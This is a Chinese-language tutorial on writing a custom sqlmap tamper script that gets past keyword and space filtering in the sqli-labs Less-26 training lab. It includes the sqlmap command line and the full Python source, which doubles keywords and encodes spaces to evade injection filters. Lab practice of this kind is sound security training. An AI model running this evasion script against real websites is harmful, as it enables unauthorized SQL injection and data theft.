# sqlmap定制武器tamper脚本编写

- 场景：sqli-labs/less-26

- 经过测试less26会过滤大部分的注入语句，如`or`、`空格`、`and`、`大小写`等，以至于sqlmap都扫不出来，这样我们就需要自己定制一个tamper脚本来完成sql注入了

- sqlmap扫描结果：

  ![image-20240312192937887](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312192937887.png)

  ![](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312192804335.png)

### 使用sqlmap tamper定制脚本

- 进入`/usr/share/sqlmap/tamper`目录创建一个python脚本文件,脚本框架复制`0eunion.py`即可，把tamper内容修改成正则匹配样式，如`re.sub`第一个参数是被替换的内容，第二个参数是替换的内容，第三个替换对象是payload，例如：`payload = re.sub(r"(?i)and","aANDnd",payload)`    :   从pyload中寻找`and `并把它替换成`aANDnd`这样双写的形式

  

  ![image-20240312200850204](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312200850204.png)

### 验证脚本可行性

- 使用`sudo python3 /usr/share/sqlmap/sqlmap.py -u "http://192.168.200.148/sqli-labs-master/Less-26/?id=1" -v 3 --tamper "test_sqli_labs_less26.py"`语句运行sqlmap

  ![image-20240312204044960](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312204044960.png)

- 扫描结果显示了已经有sql注入漏洞了，分别是报错注入，延时注入和联合查询，脚本运行成功

  ![image-20240312204229895](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312204229895.png)

### 源码：

```python
#!/usr/bin/env python
"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import re

from lib.core.enums import PRIORITY


__priority__ = PRIORITY.HIGHEST
def dependencies():
    pass

def tamper(payload,**kwargs):
    payload = re.sub(r"(?i)-- "," and '1'='1",payload)
    payload = re.sub(r"(?i)#"," and '1'='1",payload)
    payload = re.sub(r"(?i)and","aANDnd",payload)
    payload = re.sub(r"(?i)order","oORrder",payload)
    payload = re.sub(r"(?i) ","%a0",payload)

    return payload
```

